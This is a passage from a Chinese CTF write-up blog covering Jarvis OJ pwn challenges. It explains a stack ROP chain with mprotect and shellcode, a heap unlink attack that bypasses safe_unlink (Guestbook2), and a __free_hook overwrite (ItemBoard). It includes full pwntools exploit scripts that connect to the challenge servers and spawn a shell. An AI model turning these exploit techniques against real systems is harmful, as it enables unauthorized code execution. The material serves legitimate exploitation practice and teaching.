class="string">'deadbeef'</span> + p64(read_plt) + p64(main_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="keyword">print</span> shellcode</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 hijack __gmon_start__ -&gt; bss_shellcode</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">gmon_start_got = elf.got[<span class="string">'__gmon_start__'</span>]</span><br><span class="line">payload4 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(gmon_start_got) + <span class="string">'deadbeef'</span> + p64(read_plt) + p64(main_addr)</span><br><span class="line">p.send(payload4)</span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step5 using __libc_csu_init to call mprotect and change bss to executable and then execute shellcode</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload5 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + <span class="string">'deadbeef'</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(libc_start_main_got) + p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>) + p64(evercall_addr) + <span class="string">'deadbeef'</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(gmon_start_got) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(evercall_addr) </span><br><span class="line"><span class="comment">#                                                                           + 'deadbeef'    rbx      rbp      r12 -&gt; call r12+rbx*8   r13 -&gt; rdx  r14 -&gt; rsi     r15 -&gt; rdi</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+没有像大佬那样一次性把<strong>ROP链</strong>构造完全然后一次性把函数都劫持到位，但我觉得这样一步一步的逻辑清楚一些，也便于自己写脚本，然后值得一提的是在<strong>万能Gadget</strong>中若将<strong>rbx</strong>构造得比<strong>rbp</strong>少一，也就是<strong>rbx</strong>中为<strong>0</strong>，<strong>rbp</strong>中为<strong>1</strong>，那么<strong>call</strong>完之后又会跳转到我们<strong>红色箭头</strong>那里然后又可以构造一次访问其他位置。(详情可以见<strong>call</strong>完后面的那串汇编代码)</li>
+</ul>
+<hr>
+<h2 id="0x04-400pt-Guestbook2"><a href="#0x04-400pt-Guestbook2" class="headerlink" title="0x04 400pt Guestbook2"></a>0x04 400pt Guestbook2</h2><p>前面都是栈漏洞，之后应该就是堆题了吧，根据ida可以分析出结构体如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> inuse;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    <span class="keyword">char</span> *post;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>漏洞位置</strong><br>漏洞出在<strong>edit</strong>函数，在编辑已经定义的<strong>post</strong>时可以任意指定修改长度，并且<strong>realloc</strong>不会清空堆上的内容。以及<strong>del</strong>函数在<strong>free</strong>堆块后没有释放指针，造成存在<strong>Dangling Pointer</strong>。</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8447551-7f09e4432ad1ba4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="edit"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-66cc3ac5fdefc0ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="del"></p>
+<blockquote>
+<p><strong>unlink</strong></p>
+<ul>
+<li><strong>利用原理</strong><br>在<strong>free</strong>一个大小在<strong>fastbin</strong>以上的<strong>chunk</strong>时，会检查该<strong>chunk</strong>物理地址相连的两个<strong>chunk</strong>，并执行下面的逻辑:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk)</span><br><span class="line"><span class="keyword">if</span>(prev_chunk == freed)</span><br><span class="line">    unlink(prev_chunk)          <span class="comment">//将两个chunk合并</span></span><br><span class="line"><span class="keyword">if</span>(next_chunk == top_chunk)</span><br><span class="line">    ......                     <span class="comment">//合并到top_chunk</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(next_chunk == freed)</span><br><span class="line">    unlink(next_chunk)        <span class="comment">//将两个chunk合并</span></span><br><span class="line">to_unsortbin(chunk)          <span class="comment">//将经过处理合并后的chunk归入unsortbin</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>unlink</strong>的时候会执行如下操作指针的代码，并且如今还有<strong>safe_unlink</strong>的<strong>check</strong>机制。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unlink(P, BK, FD) &#123;                                            </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    <span class="keyword">if</span>(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		                        <span class="comment">//safe_unlink</span></span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);      </span><br><span class="line">    <span class="keyword">else</span>&#123;								      </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;				</span><br><span class="line">       .........................................</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>构造条件</strong><br>红色边框中的一个大堆块构造两个小堆块，大小都在<strong>unsort bin</strong>的范围内，并且将要<strong>free</strong>的堆块(黑色箭头所指)的前一个堆块为<strong>freed</strong>的状态，也就是该堆块的<strong>size</strong>位(绿色箭头所指)的<strong>prev_inuse</strong>为<strong>0</strong>，同样因为该堆块为<strong>inused</strong>状态，故下一堆块的<strong>size</strong>位(紫色箭头所指)的<strong>prev_inuse</strong>为<strong>1</strong>。这样就构造好了触发<strong>unlink</strong>的条件，此时<strong>free</strong>该堆块会导致前一个堆块进行<strong>unlink</strong>操作，现在要构造绕过<strong>safe_unlink</strong>的<strong>check</strong>了。也就是需要有一个指针指向前一个堆块的堆头处也就是如红色箭头所示<strong>ptr</strong>指向<strong>fake_prev</strong>，并且将该伪堆块的<strong>fd</strong>和<strong>bk</strong>分别布置为<strong>ptr-0x18</strong>和<strong>ptr-0x10</strong>(<strong>32位</strong>时为<strong>ptr-0xc</strong>和<strong>ptr-0x8</strong>)，这样就可以满足<strong>unsafe_unlink</strong>的<strong>check</strong>了。</li>
+<li><strong>触发效果</strong><br>在<strong>unlink</strong>红色箭头所指的堆块后，指针<strong>ptr</strong>所指会由刚刚的<strong>fake_prev</strong>变成<strong>ptr-0x18</strong>的位置(红色箭头变为蓝色箭头)，再编辑<strong>ptr</strong>的时候就能够覆盖到<strong>ptr</strong>本身实现后续利用。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-2e89f9b95e1ebbc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="unlink"></li>
+</ul>
+</blockquote>
+<ul>
+<li><strong>利用思路</strong></li>
+</ul>
+<p>先<strong>add</strong>堆块并<strong>free</strong>掉一个保证堆上有指向<strong>libc</strong>的指针，<strong>edit</strong>前一个结构体导致堆溢出覆盖掉后面的<strong>post</strong>后再通过<strong>list</strong>可泄露出<strong>libc</strong>的基址，再在后面的堆块中通过溢出构造<strong>unlink</strong>最终起<strong>shell</strong>。</p>
+<ul>
+<li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./guestbook2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)# , open('aa'))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.jarvisoj.com'</span> , <span class="number">9879</span>)<span class="comment">#nc pwn.jarvisoj.com 9879</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lst</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">'\n== PCTF'</span>)[:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'new post: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'your post: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num , length , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'number: '</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'of post: '</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'your post: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'number: '</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./guestbook2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	add(<span class="number">0x80</span> , str(i)*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Make freed_chunk1_fd be chunk3_ptr then leak heap base</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">1</span>)	<span class="comment">#We have a dangling_ptr</span></span><br><span class="line">edit(<span class="number">0</span> , <span class="number">0x90</span> , <span class="string">'a'</span> * <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">a = lst().split(<span class="string">'\n'</span>)[<span class="number">0</span>][<span class="number">0x93</span>:]</span><br><span class="line">heap_base = u64(a + <span class="string">'\x00'</span> * (<span class="number">8</span> - len(a))) - <span class="number">0x19d0</span></span><br><span class="line">chunk0_addr = heap_base + <span class="number">0x30</span></span><br><span class="line">success(<span class="string">'heap_base =&gt; '</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">'chunk0_addr =&gt; '</span> + hex(chunk0_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Make a fake_chunk satisfied the condition of unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x80</span>) + p64(chunk0_addr - <span class="number">0x18</span>) + p64(chunk0_addr - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) + <span class="string">'a'</span> * <span class="number">0x70</span></span><br><span class="line"><span class="comment">#	fake_prev_size	fake_size 	fake_fd = ptr - 0x18	  fake_bk = ptr - 0x10 		  mess	chunk1_prev_size chunk1_size mess duiqi 0x80</span></span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line">edit(<span class="number">0</span> , len(payload) , payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#trigger unlink</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#result:  chunk0_addr = chunk0_addr - 0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc.address &amp; get system_address </span></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x100</span>) + p64(chunk0_addr - <span class="number">0x18</span>) + p64(<span class="number">1</span>) + p64(<span class="number">8</span>) + p64(atoi_got)</span><br><span class="line">payload += <span class="string">'\x00'</span> * (<span class="number">0x100</span> - len(payload))</span><br><span class="line">edit(<span class="number">0</span> , len(payload) , payload)</span><br><span class="line">a = lst().split(<span class="string">'1. '</span>)[<span class="number">1</span>]</span><br><span class="line">atoi_addr = u64(a + <span class="string">'\x00'</span> * (<span class="number">8</span> - len(a)))</span><br><span class="line">libc.address = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'atoi_addr =&gt; '</span> + hex(atoi_addr))</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write atoi to system &amp; get shell</span></span><br><span class="line">edit(<span class="number">1</span> , <span class="number">8</span> , p64(system_addr)) </span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h2 id="0x05-450pt-ItemBoard"><a href="#0x05-450pt-ItemBoard" class="headerlink" title="0x05 450pt ItemBoard"></a>0x05 450pt ItemBoard</h2><p>题目没有去符号表，根据ida可分析出<strong>item</strong>数据结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">void</span> (*item_free)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>漏洞位置<br>漏洞位于<strong>new_item</strong>函数中，在输入<strong>description</strong>时给中间变量<strong>buf</strong>的长度可控，而<strong>buf</strong>为<strong>char buf[1024]</strong>，此处存在缓冲区溢出。此外在执行<strong>item_free</strong>时只没有清除指针，并且在<strong>list_item</strong>和<strong>show_item</strong>的时候没有检查是否<strong>inuse</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-0888b24a3590c5ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="new_item"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-f4fb179dc62b82ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="item_free"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-f77ca0b794807b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="list_item"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-b2d699526ff69a70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="show_item"></li>
+</ul>
+<blockquote>
+<ul>
+<li>善于利用栈上的结构体，并结合代码段的写操作构造合理的覆盖</li>
+<li><strong>__free_hook_ptr</strong>的定位，<strong>pwntools</strong>库中的<strong>libc.symbols</strong>无法定位到<strong>__free_hook_ptr</strong>，<strong>ida</strong>中查找也不是特别方便，只好在调试时先确定<strong>__free_hook</strong>的地址，再用<strong>find</strong>的指令查找<strong>__free_hook</strong>再减去<strong>libc</strong>基址便可得到<strong>__free_hook_ptr</strong>的偏移。</li>
+<li>在远程使用不同的<strong>libc</strong>时通过<strong>freed unsort bin</strong>上指向<strong>main_arena</strong>泄露地址找<strong>libc</strong>基址时偏移与本地不同的方法：可先减去<strong>__malloc_hook</strong>的偏移，然后再强行页对齐，由于<strong>main_arena</strong>在<strong>__malloc_hook</strong>下面不远处，所以先减去<strong>__malloc_hook</strong>后，离页对齐差的不是很多，可以一眼看出来该如何对齐。</li>
+</ul>
+</blockquote>
+<ul>
+<li>利用思路</li>
+</ul>
+<p>第一步，先构造<strong>free</strong>到<strong>unsort bin</strong>上的堆块，<strong>free</strong>后产生指向<strong>main_arena</strong>的地址，并通过<strong>show_item</strong>来<strong>leak</strong>出<strong>libc</strong>的基址。第二步，通过控制<strong>v2</strong>溢出<strong>buf</strong>并且继续向下覆盖掉i栈上的<strong>item</strong>结构体，在下面<strong>strcpy</strong>的时候，将<strong>buf</strong>赋值给覆盖后新的<strong>item + 8</strong>指向的地方。正常情况下我们会将<strong>free_hook</strong>改成<strong>system</strong>函数，所以我们可将<strong>item</strong>覆盖为<strong>+8</strong>后指向<strong>free_hook</strong>的地方。恰好，在<strong>libc</strong>里面会有一个<strong>__free_hook_ptr</strong>是指向<strong>__free_hook</strong>的。所以整体思路为：泄露出<strong>libc</strong>基址后，将栈上的<strong>item</strong>结构体指针覆盖为<strong>__free_hook_ptr - 8</strong>，然后通过<strong>strcpy</strong>把<strong>__free_hook</strong>覆盖为<strong>system</strong>地址，然后<strong>free</strong>掉写有<strong>/bin/sh</strong>的堆块即可<strong>get shell</strong>。</p>
+<ul>
+<li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">---</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./itemboard'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn2.jarvisoj.com'</span> , <span class="number">9887</span>)<span class="comment">#nc pwn2.jarvisoj.com 9887</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./itemboard'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name , length , description)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'len?\n'</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Description?\n'</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lst</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(<span class="string">'1.Add'</span>)[:<span class="number">-6</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(no)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'item?\n'</span>)</span><br><span class="line">	p.sendline(str(no))</span><br><span class="line">	a = p.recvuntil(<span class="string">'1.Add'</span>)[:<span class="number">-6</span>]</span><br><span class="line">	name = a.split(<span class="string">'\nDescription:'</span>)[<span class="number">0</span>].split(<span class="string">'Name:'</span>)[<span class="number">1</span>]</span><br><span class="line">	description = a.split(<span class="string">'\nDescription:'</span>)[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">return</span> name , description</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(no)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'item?\n'</span>)</span><br><span class="line">	p.sendline(str(no))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">	raw_input()</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x10</span> , <span class="number">0x80</span> , <span class="string">'1'</span> * <span class="number">4</span> + <span class="string">'Just A Fish Test'</span> + <span class="string">'2'</span> * <span class="number">4</span>)</span><br><span class="line">add(<span class="string">'b'</span> * <span class="number">0x10</span> , <span class="number">0x80</span> , <span class="string">'3'</span> * <span class="number">4</span> + <span class="string">'Just A Fish Test'</span> + <span class="string">'4'</span> * <span class="number">4</span>)</span><br><span class="line">add(<span class="string">'c'</span> * <span class="number">0x10</span> , <span class="number">0x80</span> , <span class="string">'5'</span> * <span class="number">4</span> + <span class="string">'Just A Fish Test'</span> + <span class="string">'6'</span> * <span class="number">4</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	libc.address = u64(show(<span class="number">1</span>)[<span class="number">1</span>] + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x68</span></span><br><span class="line">	free_hook_ptr = libc.address + <span class="number">0x3c3ef8</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	libc.address = u64(show(<span class="number">1</span>)[<span class="number">1</span>] + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x78</span></span><br><span class="line">	free_hook_ptr = libc.address + <span class="number">0x3bdee8</span></span><br><span class="line">	</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'free_hook_ptr =&gt; '</span> + hex(free_hook_ptr))</span><br><span class="line">success(<span class="string">'system_addr = &gt; '</span> + hex(system_addr))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span> , <span class="number">0x410</span> , p64(system_addr) + <span class="string">'a'</span> * <span class="number">0x400</span> + p64(free_hook_ptr - <span class="number">8</span>))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%5B%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%5D/">刷Jarvis OJ时学到的新姿势【不定时更新】</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Fish_o0O 的个人博客">Fish_o0O</a></p>
+        <p><span>发布时间:</span>2020年03月12日 - 20时30分</p>
+        <p><span>最后更新:</span>2020年03月12日 - 18时53分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%5B%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%5D/" title="刷Jarvis OJ时学到的新姿势【不定时更新】">http://fish-o0o.github.io/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF[%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0]/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://fish-o0o.github.io/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF[%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0]/　　作者: Fish_o0O" title=""></span>
+        </p>
+        <p>
